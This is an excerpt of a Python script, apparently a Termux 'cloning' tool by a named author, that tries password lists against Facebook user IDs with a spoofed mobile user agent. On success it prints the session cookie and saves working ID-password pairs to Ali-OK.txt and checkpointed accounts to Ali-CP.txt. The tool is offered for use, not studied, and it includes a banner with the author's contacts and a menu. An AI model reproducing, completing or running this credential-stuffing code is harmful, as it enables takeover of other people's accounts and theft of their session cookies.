...
\033[92;1m   \__|  \__| \______/  \______/ \__|  \__|

                                                               

\033[1;37m══════════════════════════════════════════

\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mRizwan Ali

\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m Rizwan Ali

\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mRizwanali444
...
#os.system("xdg-open https://www.facebook.com/Rizwan Ali")
...
def c():
	...
	if ok =='1':
		...
		os.system("xdg-open https://wa.me/+923200964191");Main()

	if ok =='2':

		os.system("xdg-open https://www.facebook.com/Rizwan Ali");Main()

	if ok =='3':

		print("\033[0;97m USER NAME :\033[0;92m  Ali ")
...
def R():
    ...
    print('\n\033[1;37m(<•>)══════════════════════════════════════════');print('[•] Cloning Complete\n[•] Total OK Ids : '+str(len(oks))+'\n[•] Total CP IDs : '+str(len(cps)));print('\033[1;37m(<•>)══════════════════════════════════════════');print('[•] OK IDS SAVE : /sdcard/Ali-OK.txt\n[•] CP IDS SAVE : /sdcard/Ali-CP.txt');input('[•] Press Enter To Back Menu ');Main()
...
class Random:
    ...
    def fbtua(self):
        ...
        try:
            ...
            print("%s\n\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> Ali-OK.txt" % (G))

            print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> Ali-CP.txt" % (Y))
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write("\r\r %s\033[0;97m[\033[0;92m A. l. i\033[0;97m]\033[0;97m  %s\033[0;97m/\033[0;92m%s \033[0;97m[\033[0;92mOK\033[0;91m:\033[0;92m%s\033[0;97m]" % (B, self.loop, len(self.id), len(self.cp)));sys.stdout.flush()
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				print('\33[1;92m[Ali-OK] '+uid+' √ '+ps+'\33[0;97m')

				print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,coki))

				

				open('Ali-OK.txt', 'a').write(uid+' √ '+ps+'\n')
				...
				print('\33[1;91m[Ali-CP] '+uid+' • '+ps+'\33[0;97m')

				open('Ali-CP.txt', 'a').write(uid+' • '+ps+'\n')
...
def file():
		...
		print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/Ali.txt");linex()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\r\033[1;37m[A.l.i] %s <•> OK:- \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                if 'y' in cp:
                                        ...
                                        print(f'\r\r\033[1;37m[Ali-CP] '+ids+' • '+pas+'\033[1;97m')
